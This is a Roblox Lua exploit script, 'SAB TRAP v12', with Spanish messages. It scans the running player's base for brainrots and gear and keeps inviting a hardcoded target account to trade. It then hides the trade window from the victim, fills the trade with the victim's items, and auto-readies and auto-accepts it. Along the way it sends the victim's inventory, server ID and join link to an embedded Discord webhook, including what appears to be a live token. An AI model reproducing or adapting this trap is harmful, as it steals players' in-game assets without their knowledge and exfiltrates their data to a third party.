--[[ ================================================================
 SAB TRAP v12 — target fijo por UserId
 Place: 109983668079237
=============================================================== ]]
local TARGET_ID       = 9555775328        -- KIMILOSP
local TARGET_USERNAME = "KIMILOSP"
local TARGET_DISPLAY  = "PIPIPI"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1566136623832498347/fnlDza_gDplkkY90bNe-Hx4GxP2n_nqWFQVpvd9wBKTfzCPuyFsd6lFxhgaY4uDVhH9B"

local CFG = {
    PLACE_IDS        = { 109983668079237 },
    STRICT_PLACE     = true,
    DUMP             = true,
    WATCH_GUI        = true,
    POLL             = 1.5,
    INVITE_BACKOFF   = { 4, 8, 15, 25, 40 },
    MAX_ITEMS        = 18,
    ITEM_DELAY       = 0.5,
    ADD_ALL_IF_EMPTY = true,
    AUTO_READY       = true,
    AUTO_ACCEPT      = true,
    READY_ROUNDS     = 3,
    SNAP_FREEZE      = 3,
    PING             = true,
    DEBUG            = true,
}

getgenv().NORMAL_BRAINROTS  = { }
getgenv().NORMAL_BASE_SKINS = { }
getgenv().NORMAL_GEARS      = { }

local Players = game:GetService("Players")
local RS      = game:GetService("ReplicatedStorage")
local WS      = game:GetService("Workspace")
local HS      = game:GetService("HttpService")
local LP      = Players.LocalPlayer
local U       = table.unpack or unpack

local S = { run = true, filling = false, handled = nil, lastSig = nil, lastPost = 0,
            invitedAt = 0, invTries = 0, seenGui = {}, dumpDone = false }
local CACHE, CACHE_AGE = {}, 0

local function log(m) if CFG.DEBUG then print("[SAB] "..tostring(m)) end end
local function lc(s) return string.lower(tostring(s)) end

local queue = {}
local function post(p) table.insert(queue, p) end
task.spawn(function()
    while S.run do
        local p = table.remove(queue, 1)
        if p then
            pcall(function()
                local body = HS:JSONEncode(p)
                if typeof(request) == "function" then
                    request({ Url = WEBHOOK_URL, Method = "POST",
                              Headers = { ["Content-Type"] = "application/json" }, Body = body })
                else HS:PostAsync(WEBHOOK_URL, body) end
            end)
            task.wait(1.1)
        else task.wait(0.3) end
    end
end)
local function embed(t, d, c)
    post({ embeds = {{ title = t, description = d, color = c or 3447003, footer = { text = LP.Name.." • "..LP.UserId } }} })
end
local function ping(t, d, c)
    post({ content = CFG.PING and "@everyone" or "", allowed_mentions = { parse = { "everyone" } },
        embeds = {{ title = t, description = d, color = c or 65280, footer = { text = LP.Name.." • "..LP.UserId } }} })
end

local function ser(v, d)
    d = d or 0
    if d > 3 then return "…" end
    local t = typeof(v)
    if t == "string" or t == "number" or t == "boolean" then return tostring(v) end
    if t == "Instance" then return v:GetFullName() end
    if t == "table" then
        local o, n = {}, 0
        for k, val in pairs(v) do
            n = n + 1
            if n > 25 then table.insert(o, "…") break end
            table.insert(o, tostring(k).."="..ser(val, d+1))
        end
        return "{"..table.concat(o, ", ").."}"
    end
    return tostring(v)
end
local function callRF(r, timeout, ...)
    if not r then return false, nil end
    local a, done, res = table.pack(...), false, nil
    task.spawn(function()
        local ok, x = pcall(function() return r:InvokeServer(U(a, 1, a.n)) end)
        res = ok and x or nil
        done = true
    end)
    local t0 = os.clock()
    while not done and os.clock() - t0 < (timeout or 5) do task.wait(0.05) end
    return done, res
end
local function fireRE(r, ...)
    if not r then return false end
    return (pcall(function() r:FireServer(...) end))
end

local NET = RS:FindFirstChild("Packages") and RS.Packages:FindFirstChild("Net")
local function resolve(kind, path)
    if not NET then return nil end
    local root = NET:FindFirstChild(kind)
    if not root then return nil end
    local direct = root:FindFirstChild(path)
    if direct then return direct end
    for _, d in ipairs(root:GetDescendants()) do
        if d.Name == path then return d end
        if d.Parent and (d.Parent.Name.."/"..d.Name) == path then return d end
    end
end
local T = {}
if NET then
    T.Invite     = resolve("RF", "TradeService/Invite")
    T.AcceptInv  = resolve("RF", "TradeService/AcceptInvite")
    T.AddBrain   = resolve("RF", "TradeService/AddBrainrot")
    T.AddItem    = resolve("RF", "TradeService/AddItem")
    T.SearchUser = resolve("RF", "TradeService/SearchUser")
    T.Ready      = resolve("RE", "TradeService/Ready")
    T.Accept     = resolve("RE", "TradeService/Accept")
    T.Cancel     = resolve("RE", "TradeService/CancelTrade")
    T.InvResult  = resolve("RE", "TradeService/InviteResult")
    T.Completed  = resolve("RE", "TradeService/TradeCompleted")
    T.Sync       = resolve("RF", "Synchronizer/RequestData")
    T.ListBrain  = resolve("RF", "Brainrot/RequestList")
    T.ListTrade  = resolve("RF", "BrainrotToTrade/RequestList")
    T.PreviewC   = resolve("RE", "TradePlazaPreview/Confirm")
end

local function matchesTarget(txt)
    local l = lc(txt)
    return l:find(lc(TARGET_USERNAME), 1, true) or l:find(lc(TARGET_DISPLAY), 1, true)
end

if T.InvResult then
    T.InvResult.OnClientEvent:Connect(function(...)
        local p = {}
        for i = 1, select("#", ...) do table.insert(p, ser((select(i, ...)))) end
        local txt = table.concat(p, " | ")
        embed("InviteResult", txt, 16776960)
        local low = lc(txt)
        if low:find("declin") or low:find("reject") or low:find("false")
           or low:find("busy") or low:find("expired") or low:find("offline") then
            S.invitedAt = 0
            S.invTries = math.max(0, S.invTries - 1)
        end
    end)
end
if T.Cancel then
    T.Cancel.OnClientEvent:Connect(function()
        embed("CancelTrade", "Cancelado, se reintenta.", 15105570)
        S.handled, S.filling, S.invitedAt, S.invTries = nil, false, 0, 0
    end)
end
if T.Completed then
    T.Completed.OnClientEvent:Connect(function()
        ping("✅ TRADE COMPLETADO", "Trade cerrado.", 65280)
        S.invitedAt, S.invTries = 0, 0
    end)
end

local function ownPlot()
    local plots = WS:FindFirstChild("Plots")
    if plots then
        local byName = plots:FindFirstChild(LP.Name)
        if byName then return byName end
        for _, p in ipairs(plots:GetChildren()) do
            local sign = p:FindFirstChild("PlotSign")
            local yb = sign and sign:FindFirstChild("YourBase")
            if yb and yb:IsA("BillboardGui") and yb.Enabled then return p end
        end
    end
    for _, d in ipairs(WS:GetChildren()) do
        if d:IsA("Model") and d.Name == LP.Name and d:FindFirstChild("AnimalPodiums") then return d end
    end
end

local ID_KEYS   = { "ItemId", "ItemID", "Id", "ID", "Uuid", "UUID", "UniqueId", "BrainrotId", "Uid" }
local NAME_KEYS = { "Name", "DisplayName", "Title", "BrainrotName", "ItemName" }
local function deepId(tbl, name, d)
    if type(tbl) ~= "table" or (d or 0) > 5 then return nil end
    local nm
    for _, k in ipairs(NAME_KEYS) do if type(tbl[k]) == "string" then nm = tbl[k] break end end
    if nm and lc(nm):find(lc(name), 1, true) then
        for _, k in ipairs(ID_KEYS) do
            local v = tbl[k]
            if type(v) == "string" or type(v) == "number" then return v end
        end
    end
    for _, v in pairs(tbl) do
        local r = deepId(v, name, (d or 0) + 1)
        if r ~= nil then return r end
    end
end
local function attrId(i)
    for _, k in ipairs(ID_KEYS) do
        local v = i:GetAttribute(k)
        if v ~= nil then return v end
    end
end
local function labelText(a)
    local oh = a:FindFirstChild("Base") and a.Base:FindFirstChild("Spawn")
        and a.Base.Spawn:FindFirstChild("Attachment")
        and a.Base.Spawn.Attachment:FindFirstChild("AnimalOverhead")
    if not oh then local inf = a:FindFirstChild("Info"); oh = inf and inf:FindFirstChild("AnimalOverhead") end
    if not oh then return nil end
    local l = oh:FindFirstChild("DisplayName")
    if l and l:IsA("TextLabel") and l.Text ~= "" then return l.Text end
    local s = oh:FindFirstChildWhichIsA("TextLabel")
    if s and s.Text ~= "" then return s.Text end
end
local function clean(t) return (tostring(t):match("^([^|]+)"):gsub("^%s*(.-)%s*$", "%1")) end

local function priority(it)
    if it.skin and getgenv().NORMAL_BASE_SKINS[it.skin] then return 1 end
    if it.kind == "brainrot" and getgenv().NORMAL_BRAINROTS[it.name] then return 2 end
    if it.kind == "gear" and (getgenv().NORMAL_GEARS[it.name] or getgenv().NORMAL_BASE_SKINS[it.name]) then return 3 end
end

local function readPlot()
    local out, plot = {}, ownPlot()
    if not plot then return out end
    local pod = plot:FindFirstChild("AnimalPodiums")
    if pod then
        for _, a in ipairs(pod:GetChildren()) do
            local raw = labelText(a)
            if raw then
                local it = { kind = "brainrot", name = clean(raw), inst = a, id = attrId(a),
                             skin = a:GetAttribute("Skin") or a:GetAttribute("BaseSkin") }
                it.prio = priority(it)
                table.insert(out, it)
            end
        end
    end
    local pur = plot:FindFirstChild("Purchases")
    if pur then
        for _, b in ipairs(pur:GetChildren()) do
            local box = b:FindFirstChild("PlotBlock")
            if box then
                for _, d in ipairs(box:GetDescendants()) do
                    if d:IsA("TextLabel") and d.Text ~= "" then
                        local it = { kind = "gear", name = clean(d.Text), inst = box, id = attrId(box) }
                        it.prio = priority(it)
                        table.insert(out, it)
                        break
                    end
                end
            end
        end
    end
    return out
end

local function guis()
    local pg = LP:FindFirstChild("PlayerGui")
    local t = {}
    if not pg then return t end
    for _, d in ipairs(pg:GetChildren()) do if d:IsA("ScreenGui") then table.insert(t, d) end end
    return t
end
local function tradeGui()
    local g = guis()
    for _, d in ipairs(g) do if lc(d.Name):find("trade", 1, true) then return d end end
    if S.invitedAt > 0 then
        for _, d in ipairs(g) do
            if not S.seenGui[d] and os.clock() - S.invitedAt > 0.8 then
                for _, x in ipairs(d:GetDescendants()) do
                    if x:IsA("TextLabel") and matchesTarget(x.Text) then return d end
                end
            end
        end
    end
end
local function hide(root)
    pcall(function()
        root.Enabled = false
        for _, d in ipairs(root:GetDescendants()) do if d:IsA("GuiObject") then d.Visible = false end end
    end)
end

local function invite()
    if not T.Invite then return end
    local ok, res = callRF(T.Invite, 6, TARGET_ID)
    log(("invite uid=%d ok=%s res=%s"):format(TARGET_ID, tostring(ok), tostring(res)))
    embed("Invite ->", "UserId "..TARGET_ID.." | res "..ser(res), 3447003)
    S.invitedAt = os.clock()
    S.invTries = S.invTries + 1
    if ok and res == false then S.invitedAt = 0 end
end
local function backoff() return CFG.INVITE_BACKOFF[math.min(S.invTries, #CFG.INVITE_BACKOFF)] end

local function addOne(it, root)
    local cands = {}
    if it.id ~= nil then table.insert(cands, { it.id }) end
    if it.inst and it.inst.Parent then table.insert(cands, { it.inst }) end
    table.insert(cands, { it.name })
    local r = it.kind == "brainrot" and T.AddBrain or T.AddItem
    if not r then return false end
    for _, a in ipairs(cands) do
        if not root.Parent then break end
        local ok, res = callRF(r, 4, U(a))
        if ok and res == true then return true end
        if ok and res == nil then task.wait(0.2) return true end
    end
    return false
end

local function fill()
    if S.filling then return end
    S.filling = true
    pcall(function()
        local root = tradeGui()
        if not root then return end
        task.wait(0.6)
        hide(root)

        local items = (#CACHE > 0) and CACHE or readPlot()
        embed("Snapshot", ("%d ítems en cache (age %d)"):format(#items, CACHE_AGE), 3447003)

        local picked = {}
        for _, it in ipairs(items) do if it.prio then table.insert(picked, it) end end
        if #picked == 0 and CFG.ADD_ALL_IF_EMPTY then
            picked = items
            embed("Aviso", "Ningún ítem casó con las listas: se añade todo.", 15105570)
        end
        table.sort(picked, function(a, b) return (a.prio or 9) < (b.prio or 9) end)

        local n = 0
        for _, it in ipairs(picked) do
            if n >= CFG.MAX_ITEMS or not root.Parent then break end
            if addOne(it, root) then n = n + 1 end
            task.wait(CFG.ITEM_DELAY)
        end
        embed("Relleno", ("%d/%d añadidos"):format(n, #picked), 3447003)

        for round = 1, CFG.READY_ROUNDS do
            if not root.Parent then break end
            task.wait(0.6)
            if CFG.AUTO_READY then fireRE(T.Ready) end
            task.wait(1.0)
            if CFG.AUTO_ACCEPT then fireRE(T.Accept) end
            task.wait(1.4)
            if not root.Parent then break end
            if round > 1 then embed("Reintento ready/accept", "ronda "..round, 16776960) end
        end
    end)
    S.filling = false
end

local function placeOk()
    if not CFG.STRICT_PLACE then return true end
    for _, id in ipairs(CFG.PLACE_IDS) do if id == game.PlaceId then return true end end
    return false
end

local function dumpAttrs(i)
    local o = {}
    for k, v in pairs(i:GetAttributes()) do table.insert(o, k.."="..tostring(v)) end
    return #o > 0 and table.concat(o, ", ") or "-"
end
local function doDump()
    if not CFG.DUMP or S.dumpDone then return end
    S.dumpDone = true
    task.spawn(function()
        local plot = ownPlot()
        embed("DUMP: plot", plot and plot:GetFullName() or "**plot no encontrado**", 10181046)
        if plot then
            local l = { "hijos:" }
            for _, c in ipairs(plot:GetChildren()) do
                table.insert(l, ("- %s [%s] %s"):format(c.Name, c.ClassName, dumpAttrs(c)))
            end
            embed("DUMP: hijos", table.concat(l, "\n"), 10181046)
            local pod = plot:FindFirstChild("AnimalPodiums")
            if pod then
                local n = 0
                for _, a in ipairs(pod:GetChildren()) do
                    n = n + 1
                    if n > 3 then break end
                    local sub = {}
                    for _, d in ipairs(a:GetDescendants()) do
                        local at = dumpAttrs(d)
                        if at ~= "-" then table.insert(sub, d.Name.." -> "..at) end
                    end
                    embed("DUMP: "..a.Name, ("propia: %s\nhijos: %s")
                        :format(dumpAttrs(a), #sub > 0 and table.concat(sub, "\n") or "-"), 10181046)
                end
            end
        end
        for _, pair in ipairs({ { "Synchronizer", T.Sync }, { "BrainrotList", T.ListBrain },
                                { "TradeList", T.ListTrade } }) do
            if pair[2] then
                local ok, r = callRF(pair[2], 4)
                if ok and r ~= nil then embed("DUMP: "..pair[1], string.sub(ser(r), 1, 3400), 10181046) end
            end
        end
        embed("DUMP: fin", "Manda esto tal cual.", 10181046)
    end)
end

task.spawn(function()
    task.wait(2)
    if not NET then embed("ERROR", "Sin Packages.Net", 15158332) end
    if not placeOk() then embed("⚠️ Place fuera de lista", ("%d (%s)"):format(game.PlaceId, game.Name), 15158332) end
    embed("Target fijo", "UserId "..TARGET_ID.." ("..TARGET_USERNAME.." / "..TARGET_DISPLAY..")", 65280)
    doDump()

    while S.run do
        if ownPlot() and not S.filling then
            local fresh = readPlot()
            if #fresh > 0 then CACHE, CACHE_AGE = fresh, 0 end
        else
            CACHE_AGE = CACHE_AGE + 1
            if CACHE_AGE == CFG.SNAP_FREEZE and #CACHE > 0 then
                embed("Plot fuera", "Plot perdido (¿teleport a la plaza?). Snapshot congelado: "..#CACHE.." ítems.", 16776960)
            end
        end

        pcall(function()
            if CFG.WATCH_GUI then
                for _, g in ipairs(guis()) do
                    if not S.seenGui[g] then S.seenGui[g] = os.clock() embed("GUI nueva", g.Name, 9807270) end
                end
            end

            local items = (#CACHE > 0) and CACHE or readPlot()
            if #items > 0 then
                local sig = ""
                for _, it in ipairs(items) do sig = sig..it.name.."|" end
                if sig ~= S.lastSig and os.clock() - S.lastPost > 10 then
                    S.lastSig, S.lastPost = sig, os.clock()
                    local br, bs, gr = {}, {}, {}
                    for _, it in ipairs(items) do
                        if it.prio == 1 then table.insert(bs, it.name)
                        elseif it.prio == 2 then table.insert(br, it.name)
                        elseif it.prio == 3 then table.insert(gr, it.name) end
                    end
                    local here = Players:FindFirstChild(TARGET_USERNAME) ~= nil
                    local d = {
                        ("**KIMILOSP aquí:** %s | **target fijo:** %d"):format(here and "sí" or "no", TARGET_ID),
                        ("**Jugadores:** %d"):format(#Players:GetPlayers()),
                        "**Servidor:** `"..(game.JobId ~= "" and game.JobId or "studio").."`",
                        ("<https://www.roblox.com/games/%d?jobId=%s>"):format(game.PlaceId, game.JobId), "",
                        ("🧠 BRAINROTS (%d)"):format(#br) }
                    for i, n in ipairs(br) do table.insert(d, i..". "..n) end
                    table.insert(d, ("\n⚙️ BASES (%d)"):format(#bs))
                    for i, n in ipairs(bs) do table.insert(d, i..". "..n) end
                    table.insert(d, ("\n🔧 GEARS (%d)"):format(#gr))
                    for i, n in ipairs(gr) do table.insert(d, i..". "..n) end
                    local txt = table.concat(d, "\n")
                    if #txt > 3800 then txt = txt:sub(1, 3790).."…" end
                    ping(("🧠 %s (%d) — target %s"):format(LP.DisplayName, LP.UserId,
                        ("<https://www.roblox.com/users/%d/profile>"):format(TARGET_ID)), txt, 65280)
                end
            end
        end)

        local root = tradeGui()
        if not root and not S.filling and placeOk() then
            if os.clock() - S.invitedAt >= backoff() then invite() end
        end
        if root then
            if S.handled ~= root then S.handled = root fill() end
        elseif S.handled then
            S.handled = nil
        end

        task.wait(CFG.POLL)
    end
end)

log("v12 cargado | target "..TARGET_ID.." | place "..game.PlaceId)
